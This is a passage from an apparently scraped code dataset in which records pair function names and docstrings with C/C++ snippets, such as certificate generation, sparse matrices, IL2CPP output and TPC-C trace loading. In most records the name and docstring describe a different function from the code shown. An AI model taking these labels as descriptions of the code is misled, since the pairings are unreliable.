ERROR_SUCCESS)\\r\\n    {\\r\\n        TLSLogEvent(\\r\\n                EVENTLOG_ERROR_TYPE, \\r\\n                TLS_E_GENERATECLIENTELICENSE,\\r\\n                TLS_E_SIGNENCODECERT, \\r\\n                dwStatus\\r\\n            );\\r\\n        goto cleanup;\\r\\n    }\\r\\n\\r\\n    iExtCount++;\\r\\n\\r\\n\\r\\n    \/\/\\r\\n    \/\/ From here - extension memory should not be free\\r\\n    \/\/\\r\\n    if(pbSPK != NULL && cbSPK != 0)\\r\\n    {\\r\\n        rgExtension[iExtCount].pszObjId = szOID_PKIS_TLSERVER_SPK_OID;\\r\\n        rgExtension[iExtCount].fCritical = FALSE;\\r\\n        rgExtension[iExtCount].Value.pbData = pbSPK;\\r\\n        rgExtension[iExtCount].Value.cbData = cbSPK;\\r\\n\\r\\n        iExtNotFreeCount++;\\r\\n        iExtCount++;\\r\\n    }\\r\\n\\r\\n    for(index = 0; \\r\\n        index < dwNumExtensions;\\r\\n        index ++, iExtCount++, iExtNotFreeCount++ )\\r\\n    {\\r\\n        if (iExtCount >= MAX_EXTENSIONS_IN_SELFSIGN)\\r\\n        {\\r\\n            iExtCount--;\\r\\n            dwStatus = ERROR_INVALID_PARAMETER;\\r\\n            goto cleanup;\\r\\n        }\\r\\n\\r\\n        rgExtension[iExtCount] = pCertExtension[index];\\r\\n    }        \\r\\n        \\r\\n    dwStatus = TLSGenerateCertificate(\\r\\n                        hCryptProv,\\r\\n                        dwKeySpec,\\r\\n                        &ulSerialNumber,\\r\\n                        &certRdn,\\r\\n                        &certRdn,\\r\\n                        &ftNotBefore,\\r\\n                        &ftNotAfter,\\r\\n                        NULL,\\r\\n                        iExtCount,\\r\\n                        rgExtension,\\r\\n                        cbEncoded,\\r\\n                        pbEncoded\\r\\n                    );                      \\r\\ncleanup:\\r\\n\\r\\n    \/\/\\r\\n    \/\/ Don\\'t free memory for SPK and extensions...\\r\\n    \/\/\\r\\n    for(int i=0; i < iExtCount - iExtNotFreeCount; i++)\\r\\n    {\\r\\n        FreeMemory(rgExtension[i].Value.pbData);\\r\\n    }\\r\\n\\r\\n    return (dwStatus != ERROR_SUCCESS) ? TLS_E_CREATE_SELFSIGN_CERT : ERROR_SUCCESS;\\r\\n}'}","id":2386}
{"content":"{'function_name': 'DeleteExtractedFiles', 'docstring': '\/\/ Delete the temp dir (if it is empty, otherwise fail).', 'code': 'bool GetWorkDir(HMODULE module, wchar_t* work_dir) {\\n  wchar_t base_path[MAX_PATH];\\n  DWORD len = ::GetTempPath(MAX_PATH, base_path);\\n  if (len >= MAX_PATH || len <= 0) {\\n    \/\/ Problem in getting TEMP path so just use current directory as base path\\n    len = ::GetModuleFileNameW(module, base_path, MAX_PATH);\\n    if (len >= MAX_PATH || len <= 0)\\n      return false;  \/\/ Can\\'t even get current directory? Return with error.\\n    wchar_t* name = GetNameFromPathExt(base_path, len);\\n    *name = L\\'\\\\0\\';\\n  }\\n\\n  wchar_t temp_name[MAX_PATH];\\n  if (!GetTempFileName(base_path, L\"CR_\", 0, temp_name))\\n    return false;  \/\/ Didn\\'t get any temp name to use. Return error.\\n  len = GetLongPathName(temp_name, work_dir, MAX_PATH);\\n  if (len >= MAX_PATH || len <= 0)\\n    return false;  \/\/ Couldn\\'t get full path to temp dir. Return error.\\n\\n  \/\/ GetTempFileName creates the file as well so delete it before creating\\n  \/\/ the directory in its place.\\n  if (!::DeleteFile(work_dir) || !::CreateDirectory(work_dir, NULL))\\n    return false;  \/\/ What\\'s the use of temp dir if we can not create it?\\n  ::lstrcat(work_dir, L\"\\\\\\\\\");\\n  return true;\\n}'}","id":2387}
{"content":"{'function_name': 'getGamma', 'docstring': '\/\/ parallel', 'code': 'Eigen::SparseMatrix<T, Eigen::RowMajor, iType> get_L(int const npar,  T* const __restrict__ par)const\\n    {\\n\\n      iType const npix = nx*ny;\\n      iType const ndat = nDat;\\n      iType const Nx = nx;\\n      iType const Ny = ny;\\n      iType const nthreads = Me.size();\\n\\n\\n      iType const nPen = npix*2*npar;\\n      T const sqr_nPen = sqrt(T(nPen));\\n      std::vector<T> iAlpha(npar, T(0));\\n      for(int ii=0;ii<npar; ++ii) iAlpha[ii] = sqrt(Pinfo[ii].alpha) \/ sqr_nPen;\\n      \\n      \/\/ --- get matrix dimensions --- \/\/\\n\\n      int const nrows = 2*npar*npix;\\n      int const ncols = npix*npar;\\n\\n      Eigen::SparseMatrix<T,Eigen::RowMajor, iType> L(nrows, ncols);\\n\\n      \\n      \/\/ --- Get number of elements per row --- \/\/\\n\\n      int const Elements_per_row = 2;\\n      Eigen::VectorXi nElements_per_row = Eigen::VectorXi::Constant(2*npix*npar, Elements_per_row); \/\/ 1D vector of integers\\n\\n\\n\\n      \/\/ --- correct numbers for first column and first row --- \/\/\\n      \\n      for(int pp=0; pp<npar; ++pp){\\n\\t\\n\\tfor(int yy = 0; yy<Ny; ++yy){\\n\\t  int const iPix = (yy*nx + 0);\\n\\t  nElements_per_row[2*iPix * npar + 2*pp+1] = 0;\\n\\t} \/\/ yy\\n\\t\\n\\tfor(int xx = 0; xx<Nx; ++xx){\\n\\t  int const iPix = (0*Nx + xx);\\n\\t  nElements_per_row[2*iPix * npar + 2*pp ] = 0;\\n\\t} \/\/ xx\\n\\n      }\/\/ pp\\n      \\n\\n\\n      \\n      \/\/ --- reserve elements in the sparse matrix --- \/\/\\n      \\n      L.reserve(nElements_per_row);\\n\\n\\n\\n      \\n      \/\/ --- Fill Matrix in parallel --- \/\/\\n      \\n      iType ipix=0, tid=0, xx=0, yy=0, pp=0;\\n#pragma omp parallel default(shared) firstprivate(ipix, tid, xx, yy, pp) num_threads(nthreads)      \\n      {\\n\\ttid = omp_get_thread_num();\\n#pragma omp for\\n\\tfor(ipix=1; ipix<npix; ++ipix){\\n\\t  yy = ipix \/ nx;\\n\\t  xx = ipix - yy*nx;\\n\\t  \\n\\t  \/\/ --- Each thread fills all regularization derivatives for one pixel (all parameters) --- \/\/\\n\\t  \\n\\t  if((yy-1) >= 0)\\n \\t    for(pp = 0; pp<npar; ++pp){\\n\\t      L.insert(2*npar*ipix + 2*pp    , ipix*npar + pp - npar*nx) = -iAlpha[pp]; \/\/ One pixel below\\n\\t      L.insert(2*npar*ipix + 2*pp    , ipix*npar + pp)           =  iAlpha[pp]; \/\/ the pixel itself.\\t      \\n\\t    }\\n\\t  \\n\\t  if((xx-1) >= 0)\\n\\t    for(pp = 0; pp<npar; ++pp){\\n\\t      L.insert(2*npar*ipix + 2*pp+1  , ipix*npar + pp - npar)    = -iAlpha[pp]; \/\/ One pixel to the left\\n\\t      L.insert(2*npar*ipix + 2*pp+1  , ipix*npar + pp)           =  iAlpha[pp]; \/\/ the pixel itself.\\n\\t    }\\n\\t} \/\/ipix\\t\\n      }\/\/ parallel\\n\\n      return L;\\n    }'}","id":2392}
{"content":"{'function_name': 'MimeOleGetAllocator', 'docstring': '\/\/ Allocate MimeOleMalloc\\r', 'code': 'MIMEOLEAPI MimeOleCreateHashTable(DWORD dwSize, BOOL fDupeKeys, IHashTable **ppHashTable)\\r\\n{\\r\\n    \/\/ Locals\\r\\n    HRESULT               hr=S_OK;\\r\\n    IHashTable            *pHash;\\r\\n\\r\\n    \/\/ check params\\r\\n    if (NULL == ppHashTable)\\r\\n        return TrapError(E_INVALIDARG);\\r\\n\\r\\n    \/\/ Init\\r\\n    *ppHashTable = NULL;\\r\\n\\r\\n    \/\/ Allocate MimeMessage\\r\\n    CHECKALLOC(pHash = new CHash(NULL));\\r\\n\\r\\n    \/\/ Init New\\r\\n    CHECKHR(hr = pHash->Init(dwSize, fDupeKeys));\\r\\n\\r\\n    \/\/ Success\\r\\n    *ppHashTable = pHash;\\r\\n    (*ppHashTable)->AddRef();\\r\\n\\r\\nexit:\\r\\n    \/\/ Done\\r\\n    SafeRelease(pHash);\\r\\n\\r\\n    \/\/ Done\\r\\n    return hr;\\r\\n}'}","id":2399}
{"content":"{'function_name': 'viderBuffer', 'docstring': '\/\/ Le flux est dans un \u00e9tat invalide donc on le remet en \u00e9tat valide', 'code': 'date  fetchBirthday(date dateJour) {\\n\\n\\tbool valid;\\n\\tdate Date;\\n\\tint jour, mois, annee;\\n\\n\\tdo\\n\\t{\\n\\t\\tvalid = true;\\n\\t\\tviderBuffer();\\n\\t\\tcout << endl << \"Entrer un votre date de naissance (jj mm aaaa) : \";\\n\\t\\tcin >> jour >> mois >> annee;\\n\\n\\t\\t\/\/si le stream devient faux ou if(cin.fail())\\n\\t\\tif (!cin) {\\n\\t\\t\\tcout << endl << \"Vous devez entrer un entier.\";\\n\\t\\t\\tvalid = false;\\n\\t\\t}\\n\\t\\telse if (jour < 1 || jour > 31) {\\n\\t\\t\\tcout << endl << \"Le jour doit \u00eatre entre 1 et 31\";\\n\\t\\t\\tvalid = false;\\n\\t\\t}\\n\\t\\telse if (mois < 1 || mois > 12) {\\n\\t\\t\\tcout << endl << \"le mois doit etre entre 1 et 12\";\\n\\t\\t\\tvalid = false;\\n\\t\\t}\\n\\t\\telse if (annee < 1900 || annee > dateJour.getAnnee()) {\\n\\t\\t\\tcout << \"L\\'ann\u00e9e doit etre en 1900 et \" << annee + 1900 << endl;\\n\\t\\t\\tvalid = false;\\n\\t\\t}\\n\\n\\t} while (!valid);\\n\\n\\t\/*Date.setJour(jour);\\n\\tDate.setMois(mois--);\\n\\tDate.setAnnee(annee);*\/\\n\\tDate.setDate(jour, mois--, annee);\\n\\t\\n\\t\/\/Date.mois--;\\t\\t\/\/mois de 0 \u00e0 11 car indice\\n\\n\\treturn Date;\\n}'}","id":2402}
{"content":"{'function_name': 'Dictionary_2_Do_ICollectionCopyTo_TisInt32_t1448170597_m1526703923_gshared', 'docstring': '\/\/ end catch (depth: 1)', 'code': 'void Dictionary_2_Do_ICollectionCopyTo_TisIl2CppObject_m545661084_gshared (Dictionary_2_t3070427539 * __this, Il2CppArray * ___array, int32_t ___index, Transform_1_t368283573 * ___transform, const MethodInfo* method)\\n{\\n\\tstatic bool s_Il2CppMethodIntialized;\\n\\tif (!s_Il2CppMethodIntialized)\\n\\t{\\n\\t\\til2cpp_codegen_initialize_method (Dictionary_2_Do_ICollectionCopyTo_TisIl2CppObject_m545661084_MetadataUsageId);\\n\\t\\ts_Il2CppMethodIntialized = true;\\n\\t}\\n\\tType_t * V_0 = NULL;\\n\\tType_t * V_1 = NULL;\\n\\tException_t1145979430 * V_2 = NULL;\\n\\tException_t1145979430 * __last_unhandled_exception = 0;\\n\\tNO_UNUSED_WARNING (__last_unhandled_exception);\\n\\tException_t1145979430 * __exception_local = 0;\\n\\tNO_UNUSED_WARNING (__exception_local);\\n\\tint32_t __leave_target = 0;\\n\\tNO_UNUSED_WARNING (__leave_target);\\n\\t{\\n\\t\\tIL2CPP_RUNTIME_CLASS_INIT(Type_t_il2cpp_TypeInfo_var);\\n\\t\\tType_t * L_0 = Type_GetTypeFromHandle_m432505302(NULL \/*static, unused*\/, (RuntimeTypeHandle_t2078935215 )LoadTypeToken(IL2CPP_RGCTX_TYPE(method->rgctx_data, 0)), \/*hidden argument*\/NULL);\\n\\t\\tV_0 = (Type_t *)L_0;\\n\\t\\tIl2CppArray * L_1 = ___array;\\n\\t\\tNullCheck((Il2CppObject *)L_1);\\n\\t\\tType_t * L_2 = Object_GetType_m191970594((Il2CppObject *)L_1, \/*hidden argument*\/NULL);\\n\\t\\tNullCheck((Type_t *)L_2);\\n\\t\\tType_t * L_3 = VirtFuncInvoker0< Type_t * >::Invoke(43 \/* System.Type System.Type::GetElementType() *\/, (Type_t *)L_2);\\n\\t\\tV_1 = (Type_t *)L_3;\\n\\t}\\n\\nIL_0017:\\n\\ttry\\n\\t{ \/\/ begin try (depth: 1)\\n\\t\\t{\\n\\t\\t\\tType_t * L_4 = V_0;\\n\\t\\t\\tNullCheck((Type_t *)L_4);\\n\\t\\t\\tbool L_5 = VirtFuncInvoker0< bool >::Invoke(30 \/* System.Boolean System.Type::get_IsPrimitive() *\/, (Type_t *)L_4);\\n\\t\\t\\tif (L_5)\\n\\t\\t\\t{\\n\\t\\t\\t\\tgoto IL_002d;\\n\\t\\t\\t}\\n\\t\\t}\\n\\nIL_0022:\\n\\t\\t{\\n\\t\\t\\tType_t * L_6 = V_1;\\n\\t\\t\\tNullCheck((Type_t *)L_6);\\n\\t\\t\\tbool L_7 = VirtFuncInvoker0< bool >::Invoke(30 \/* System.Boolean System.Type::get_IsPrimitive() *\/, (Type_t *)L_6);\\n\\t\\t\\tif (!L_7)\\n\\t\\t\\t{\\n\\t\\t\\t\\tgoto IL_003f;\\n\\t\\t\\t}\\n\\t\\t}\\n\\nIL_002d:\\n\\t\\t{\\n\\t\\t\\tType_t * L_8 = V_1;\\n\\t\\t\\tType_t * L_9 = V_0;\\n\\t\\t\\tNullCheck((Type_t *)L_8);\\n\\t\\t\\tbool L_10 = VirtFuncInvoker1< bool, Type_t * >::Invoke(40 \/* System.Boolean System.Type::IsAssignableFrom(System.Type) *\/, (Type_t *)L_8, (Type_t *)L_9);\\n\\t\\t\\tif (L_10)\\n\\t\\t\\t{\\n\\t\\t\\t\\tgoto IL_003f;\\n\\t\\t\\t}\\n\\t\\t}\\n\\nIL_0039:\\n\\t\\t{\\n\\t\\t\\tException_t1145979430 * L_11 = (Exception_t1145979430 *)il2cpp_codegen_object_new(Exception_t1145979430_il2cpp_TypeInfo_var);\\n\\t\\t\\tException__ctor_m3886110570(L_11, \/*hidden argument*\/NULL);\\n\\t\\t\\tIL2CPP_RAISE_MANAGED_EXCEPTION(L_11);\\n\\t\\t}\\n\\nIL_003f:\\n\\t\\t{\\n\\t\\t\\tIl2CppArray * L_12 = ___array;\\n\\t\\t\\tint32_t L_13 = ___index;\\n\\t\\t\\tTransform_1_t368283573 * L_14 = ___transform;\\n\\t\\t\\tNullCheck((Dictionary_2_t3070427539 *)__this);\\n\\t\\t\\t((  void (*) (Dictionary_2_t3070427539 *, ObjectU5BU5D_t3632007997*, int32_t, Transform_1_t368283573 *, const MethodInfo*))IL2CPP_RGCTX_METHOD_INFO(method->rgctx_data, 1)->method)((Dictionary_2_t3070427539 *)__this, (ObjectU5BU5D_t3632007997*)((ObjectU5BU5D_t3632007997*)Castclass(L_12, ObjectU5BU5D_t3632007997_il2cpp_TypeInfo_var)), (int32_t)L_13, (Transform_1_t368283573 *)L_14, \/*hidden argument*\/IL2CPP_RGCTX_METHOD_INFO(method->rgctx_data, 1));\\n\\t\\t\\tgoto IL_0069;\\n\\t\\t}\\n\\t} \/\/ end try (depth: 1)\\n\\tcatch(Il2CppExceptionWrapper& e)\\n\\t{\\n\\t\\t__exception_local = (Exception_t1145979430 *)e.ex;\\n\\t\\tif(il2cpp_codegen_class_is_assignable_from (Exception_t1145979430_il2cpp_TypeInfo_var, e.ex->object.klass))\\n\\t\\t\\tgoto CATCH_0052;\\n\\t\\tthrow e;\\n\\t}\\n\\nCATCH_0052:\\n\\t{ \/\/ begin catch(System.Exception)\\n\\t\\t{\\n\\t\\t\\tV_2 = (Exception_t1145979430 *)((Exception_t1145979430 *)__exception_local);\\n\\t\\t\\tException_t1145979430 * L_15 = V_2;\\n\\t\\t\\tArgumentException_t2320721629 * L_16 = (ArgumentException_t2320721629 *)il2cpp_codegen_object_new(ArgumentException_t2320721629_il2cpp_TypeInfo_var);\\n\\t\\t\\tArgumentException__ctor_m3312963299(L_16, (String_t*)_stringLiteral3845490374, (String_t*)_stringLiteral1185213181, (Exception_t1145979430 *)L_15, \/*hidden argument*\/NULL);\\n\\t\\t\\tIL2CPP_RAISE_MANAGED_EXCEPTION(L_16);\\n\\t\\t}\\n\\nIL_0064:\\n\\t\\t{\\n\\t\\t\\tgoto IL_0069;\\n\\t\\t}\\n\\t} \/\/ end catch (depth: 1)\\n\\nIL_0069:\\n\\t{\\n\\t\\treturn;\\n\\t}\\n}'}","id":2403}
{"content":"{'function_name': 'cast_to_column_type', 'docstring': '\/\/ Cast the expression to match the type of the output column.', 'code': \"std::shared_ptr<Analyzer::Expr> reverse_logical_distribution(\\n    const std::shared_ptr<Analyzer::Expr>& expr) {\\n  const auto expr_terms = qual_to_disjunctive_form(expr);\\n  CHECK_GE(expr_terms.size(), size_t(1));\\n  const auto& first_term = expr_terms.front();\\n  const auto first_term_factors = qual_to_conjunctive_form(first_term);\\n  std::vector<std::shared_ptr<Analyzer::Expr>> common_factors;\\n  \/\/ First, collect the conjunctive components common to all the disjunctive components.\\n  \/\/ Don't do it for simple qualifiers, we only care about expensive or join qualifiers.\\n  for (const auto& first_term_factor : first_term_factors.quals) {\\n    bool is_common =\\n        expr_terms.size() > 1;  \/\/ Only report common factors for disjunction.\\n    for (size_t i = 1; i < expr_terms.size(); ++i) {\\n      const auto crt_term_factors = qual_to_conjunctive_form(expr_terms[i]);\\n      if (!list_contains_expression(crt_term_factors.quals, first_term_factor)) {\\n        is_common = false;\\n        break;\\n      }\\n    }\\n    if (is_common) {\\n      common_factors.push_back(first_term_factor);\\n    }\\n  }\\n  if (common_factors.empty()) {\\n    return expr;\\n  }\\n  \/\/ Now that the common expressions are known, collect the remaining expressions.\\n  std::vector<std::shared_ptr<Analyzer::Expr>> remaining_terms;\\n  for (const auto& term : expr_terms) {\\n    const auto term_cf = qual_to_conjunctive_form(term);\\n    std::vector<std::shared_ptr<Analyzer::Expr>> remaining_quals(\\n        term_cf.simple_quals.begin(), term_cf.simple_quals.end());\\n    for (const auto& qual : term_cf.quals) {\\n      if (!list_contains_expression(common_factors, qual)) {\\n        remaining_quals.push_back(qual);\\n      }\\n    }\\n    if (!remaining_quals.empty()) {\\n      remaining_terms.push_back(build_logical_expression(remaining_quals, kAND));\\n    }\\n  }\\n  \/\/ Reconstruct the expression with the transformation applied.\\n  const auto common_expr = build_logical_expression(common_factors, kAND);\\n  if (remaining_terms.empty()) {\\n    return common_expr;\\n  }\\n  const auto remaining_expr = build_logical_expression(remaining_terms, kOR);\\n  return Parser::OperExpr::normalize(kAND, kONE, common_expr, remaining_expr);\\n}\"}","id":2409}
{"content":"{'function_name': 'projection', 'docstring': '\/*Matrix m = Matrix::identity();\\n\\tfov = fov \/ 180.0 * PI;\\n\\tfloat t = fabs(near) * tan(fovy \/ 2);\\n\\tfloat r = aspect * t;\\n\\n\\tm[0][0] = near \/ r;\\n\\tm[1][1] = near \/ t;\\n\\tm[2][2] = (near + far) \/ (near - far);\\n\\tm[2][3] = 2 * near * far \/ (far - near);\\n\\tm[3][2] = 1;\\n\\tm[3][3] = 0;\\n\\treturn m;*\/', 'code': 'Vec3f barycentric(Triangle& t, Vec2i P)\\n{\\n\\t\/\/\u53c9\u4e58\\n\\tVec3f u = cross(Vec3f(t.p2.s_v.x - t.p0.s_v.x,t.p1.s_v.x - t.p0.s_v.x, t.p0.s_v.x - P[0]), Vec3f(t.p2.s_v.y - t.p0.s_v.y, t.p1.s_v.y - t.p0.s_v.y, t.p0.s_v.y - P[1]));\\n\\t\/* `pts` and `P` has integer value as coordinates\\n\\t   so `abs(u[2])` < 1 means `u[2]` is 0, that means\\n\\t   triangle is degenerate, in this case return something with negative coordinates *\/\\n\\tif (std::abs(u[2]) < 1) return Vec3f(-1, 1, 1);\\n\\treturn Vec3f(1.f - (u.x + u.y) \/ u.z, u.y \/ u.z, u.x \/ u.z);\\n\\n\\t\/*float x = P.x;\\n\\tfloat y = P.y;\\n\\tconst Triangle& pts = *this;\\n\\tfloat c1 = (x * (pts[1].w_v.y - pts[2].w_v.y) + (pts[2].w_v.x - pts[1].w_v.x) * y + pts[1].w_v.x * pts[2].w_v.y - pts[2].w_v.x * pts[1].w_v.y) \/\\n\\t\\t(pts[0].w_v.x * (pts[1].w_v.y - pts[2].w_v.y) + (pts[2].w_v.x - pts[1].w_v.x) * pts[0].w_v.y + pts[1].w_v.x * pts[2].w_v.y -\\n\\t\\t\\tpts[2].w_v.x * pts[1].w_v.y);\\n\\tfloat c2 = (x * (pts[2].w_v.y - pts[0].w_v.y) + (pts[0].w_v.x - pts[2].w_v.x) * y + pts[2].w_v.x * pts[0].w_v.y - pts[0].w_v.x * pts[2].w_v.y) \/\\n\\t\\t(pts[1].w_v.x * (pts[2].w_v.y - pts[0].w_v.y) + (pts[0].w_v.x - pts[2].w_v.x) * pts[1].w_v.y + pts[2].w_v.x * pts[0].w_v.y -\\n\\t\\t\\tpts[0].w_v.x * pts[2].w_v.y);\\n\\tfloat c3 = (x * (pts[0].w_v.y - pts[1].w_v.y) + (pts[1].w_v.x - pts[0].w_v.x) * y + pts[0].w_v.x * pts[1].w_v.y - pts[1].w_v.x * pts[0].w_v.y) \/\\n\\t\\t(pts[2].w_v.x * (pts[0].w_v.y - pts[1].w_v.y) + (pts[1].w_v.x - pts[0].w_v.x) * pts[2].w_v.y + pts[0].w_v.x * pts[1].w_v.y -\\n\\t\\t\\tpts[1].w_v.x * pts[0].w_v.y);\\n\\treturn { c1, c2, c3 };*\/\\n}'}","id":2411}
{"content":"{'function_name': 'getOrderKey2', 'docstring': '\/\/ o_d_id,o_w_id,o_c_id', 'code': 'int loadTransactions(const char *trace_name, int trans_num, int whichs, struct input_new_order_t *&neworders, \\n                     struct input_payment_t* &payments, struct input_delivery_t *&deliverys, \\n                     struct input_order_status_t*& orderstatuss,struct input_stock_level_t *&stocklevels,int *&choice) \\n{\\n    \/\/ whichs 11111b 5 types all, a bitmap\\n    FILE *fp = fopen (trace_name, \"r\");\\n    if (fp == NULL) {\\n        printf (\"[main][loadTransactionsNP][ERROR]: file name error! -1\\\\n\");\\n        return -1;\\n    }\\n    char tran_buffer[1024];\\n    int load_number = 0;\\n    int neworders_number=0, payments_number=0,\\n        deliverys_number=0, orderstatuss_number=0,stocklevels_number=0;\\n    neworders = new struct input_new_order_t[trans_num];\\n    payments = new struct input_payment_t[trans_num];\\n    deliverys = new struct input_delivery_t[trans_num];\\n    orderstatuss = new struct input_order_status_t[trans_num];\\n    stocklevels = new struct input_stock_level_t[trans_num];\\n    choice = new int[trans_num];\\n    while ((fread (tran_buffer,1024,1,fp)) > 0) {\\n        if ((whichs&16) && (*(int*)tran_buffer == NEW_ORDER+100)) {\\n            \/\/if (neworders == NULL) continue;\\n            memcpy(&neworders[neworders_number], tran_buffer+sizeof(int), sizeof(struct input_new_order_t));\\n            neworders_number++;\\n            choice[load_number++] = NEW_ORDER;\\n            if (load_number >= trans_num) {\\n                fclose (fp);\\n                break;\\n            }\\n        }\\n        else if ((whichs&8) && (*(int*)tran_buffer == PAYMENT+100)) {\\n            \/\/if (payments == NULL) continue;\\n            memcpy(&payments[payments_number], tran_buffer+sizeof(int), sizeof(struct input_payment_t));\\n            payments_number ++;\\n            choice[load_number++] = PAYMENT;\\n            if (load_number >= trans_num) {\\n                fclose (fp);\\n                break;\\n            }\\n        }\\n        else if ((whichs&4) && (*(int*)tran_buffer == DELIVERY+100)) {\\n            \/\/if (deliverys == NULL) continue;\\n            memcpy(&deliverys[deliverys_number], tran_buffer+sizeof(int), sizeof(struct input_delivery_t));\\n            deliverys_number ++;\\n            choice[load_number++] = DELIVERY;\\n            if (load_number >= trans_num) {\\n                fclose (fp);\\n                break;\\n            }\\n        }\\n        else if ((whichs&2) && (*(int*)tran_buffer == ORDER_STATUS+100)) {\\n            \/\/if (orderstatuss == NULL) continue;\\n            memcpy(&orderstatuss[orderstatuss_number], tran_buffer+sizeof(int), sizeof(struct input_order_status_t));\\n            orderstatuss_number ++;\\n            choice[load_number++] = ORDER_STATUS;\\n            if (load_number >= trans_num) {\\n                fclose (fp);\\n                break;\\n            }\\n        }\\n        else if ((whichs&1) && (*(int*)tran_buffer == STOCK_LEVEL+100)) {\\n            \/\/if (stocklevels == NULL) continue;\\n            memcpy(&stocklevels[stocklevels_number], tran_buffer+sizeof(int), sizeof(struct input_stock_level_t));\\n            stocklevels_number ++;\\n            choice[load_number++] = STOCK_LEVEL;\\n            if (load_number >= trans_num) {\\n                fclose (fp);\\n                break;\\n            }\\n        }\\n    }\\n    \/\/ printf (\"loadTransactions nn: %d pp: %d dd: %d oo: %d ss: %d\\\\n\", neworders_number, payments_number, deliverys_number, orderstatuss_number, stocklevels_number);\\n    return load_number;\\n}'}","id":2419}
{"content":"{'function_name': 'parse_softmax', 'docstring': '\/\/ Do not create the softmax layer in SGX. Final prediction will be done locally on the trustzone device', 'code': 'cost_layer make_cost_layer(int batch, int inputs, COST_TYPE cost_type, float scale, int index)\\n{\\n    if(index >= global_start_index)\\n    {\\n        fprintf(stderr, \"cost_TA                                        %4d\\\\n\",  inputs);\\n    }\\n    layer l;\\n    memset((void *)&l, 0, sizeof(layer));\\n    l.type = COST;\\n\\n    l.scale = scale;\\n    l.batch = batch;\\n    l.inputs = inputs;\\n    l.outputs = inputs;\\n    l.cost_type = cost_type;\\n    l.delta = (float *)calloc(inputs*batch, sizeof(float));\\n    l.output = (float *)calloc(inputs*batch, sizeof(float));\\n    l.cost = (float *)calloc(1, sizeof(float));\\n\\n    \/\/l.forward = forward_cost_layer;\\n    \/\/l.backward = backward_cost_layer;\\n    l.forward = NULL;\\n    l.backward = NULL;\\n    return l;\\n}'}","id":2424}
{"content":"{'function_name': 'DCCDisp_BytBinMem', 'docstring': '\/* Handle the remainder. *\/', 'code': \"PUBLIC void\\nDCCDisp_ByrBinMem(tok_t op, rc_t                     src, target_siz_t src_bytes,\\n                  struct DCCMemLoc const *__restrict dst, target_siz_t dst_bytes,\\n                  int src_unsigned) {\\n target_siz_t common_size;\\n struct DCCMemLoc new_dst;\\n struct DCCSym *jsym = NULL;\\n if (op == '=') { DCCDisp_ByrMovMem(src,src_bytes,dst,dst_bytes,src_unsigned); return; }\\n if (dst_bytes > DCC_TARGET_SIZEOF_ARITH_MAX && IS_LARGE_OP(op)) {\\n  DCCDisp_LargeByrBinMem(op,src,src_bytes,\\n                            dst,dst_bytes,\\n                         src_unsigned);\\n  return;\\n }\\n \/* Fallback. *\/\\n src = DCCVStack_CastReg(src,src_unsigned,DCC_RC_I8);\\n common_size = dst_bytes < src_bytes ? dst_bytes : src_bytes;\\n if (common_size) {\\n  DCCDisp_ByrBinMem_fixed(op,src,dst,common_size);\\n       if (op == '+') op = TOK_INC;\\n  else if (op == '-') op = TOK_DEC;\\n  else if (op == '?' && common_size != dst_bytes) {\\n   \/* Special handling for compare operations. *\/\\n   if ((jsym = DCCUnit_AllocSym()) != NULL)\\n        DCCDisp_SymJcc(DCC_TEST_NE,jsym);\\n  }\\n }\\n\\n \/* zero-\/sign-extend the remainder. *\/\\n new_dst         = *dst;\\n new_dst.ml_off += common_size;\\n common_size = dst_bytes-common_size;\\n if (common_size) {\\n  if (!src_unsigned) {\\n   \/* sign-extend: src = (uint8_t)sign_extend(src); *\/\\n   DCCDisp_SignMirrorReg(src);\\n   DCCDisp_ByrBinMem(op,src,common_size,&new_dst,common_size,1);\\n  } else {\\n   DCCDisp_BytBinMem(op,0,common_size,&new_dst,common_size,1);\\n  }\\n }\\n if (jsym) t_defsym(jsym);\\n}\"}","id":2430}
{"content":"{'function_name': 'dfs2', 'docstring': '\/\/ 4 connections 4 subtrees', 'code': 'int main() {\\n    \/\/ freopen(\"data.txt\", \"r\", stdin);\\n    scanf(\"%d%d\", &N, &K);\\n    for (int i = 0, A, B; i < N-1; ++i) {\\n        scanf(\"%d%d\", &A, &B);\\n        adj[A].push_back(B);\\n        adj[B].push_back(A);\\n    }\\n\\n    dfs1(1, 0);\\n\\n    if (K==1) return !printf(\"%d\\\\n\", 2 * N - 1 - diameter );\\n\\n    dfs2(1, 0);\\n    \/\/ for (int i = 1; i <= N; ++i) printf(\"node[%d]: dia = %d, connected = %d, dis = %d\\\\n\", i, dia[i], f[1][i], f[0][i]);\\n    \\n    printf(\"%d\\\\n\", 2*N-f[0][1]);\\n\\n}'}","id":2433}
{"content":"{'function_name': 'ShvUIRegisterServer', 'docstring': '\/\/ set the server path.', 'code': 'STDMETHODIMP\\nShvUIUnRegisterServer()\\n{\\n    HRESULT hr = S_OK;\\n\\n    wchar_t wszCLSIDKey[MAX_LENGTH];                      \/\/ CLSID\\\\\\\\wszCLSID.\\n\\n    \/\/ get the class ID strings.\\n\\n    hr = StringCchPrintf(wszCLSIDKey, MAX_LENGTH-1, L\"%ws\\\\\\\\%ws\", REGCLSID, CLSIDSTR_MS_SHVUI);\\n    if (FAILED(hr))\\n        goto cleanup;\\n\\n\\n    \/\/ delete Class ID key\\n    hr = ShvuiDeleteRegistryKey(\\n             HKEY_CLASSES_ROOT,\\n             wszCLSIDKey);\\n    if (FAILED(hr))\\n        goto cleanup;\\n\\ncleanup:\\n    return hr;\\n}'}","id":2434}
{"content":"{'function_name': 'FragmentStore', 'docstring': '\/\/ ATTENTION: The order of these keywords must correspond to the order of the enums above.', 'code': \"inline bool\\n_storeAppendRead (\\n    FragmentStore<TSpec, TConfig> & fragStore,\\n    TId & readId,\\n    TName const & qname,\\n    TString const & readSeq,\\n    TFlag const flag,\\n    TContext &)\\n{\\n    typedef FragmentStore<TSpec, TConfig> TFragmentStore;\\n    typedef typename Value<typename TFragmentStore::TMatePairStore>::Type TMatePairElement;\\n\\n    \/\/ search for readId by name (could be me or my mate)\\n    bool found = getIdByName(readId, fragStore.readNameStoreCache, qname);\\n\\n    \/\/ if naming scheme is xx\/1, xx\/2 or xx\/L, xx\/R try to look up my mate\\n    if (!found && (flag & 1) == 1 && length(qname) >= 2 && qname[length(qname) - 2] == '\/')\\n    {\\n        CharString mate;\\n\\n        char tag = back(qname);\\n        if (tag == '1' || tag == '2')\\n        {\\n            mate = qname;\\n            back(mate) = (tag == '1')? '2': '1';\\n        }\\n        else if (tag == 'L' || tag == 'R')\\n        {\\n            mate = qname;\\n            back(mate) = (tag == 'L')? 'R': 'L';\\n        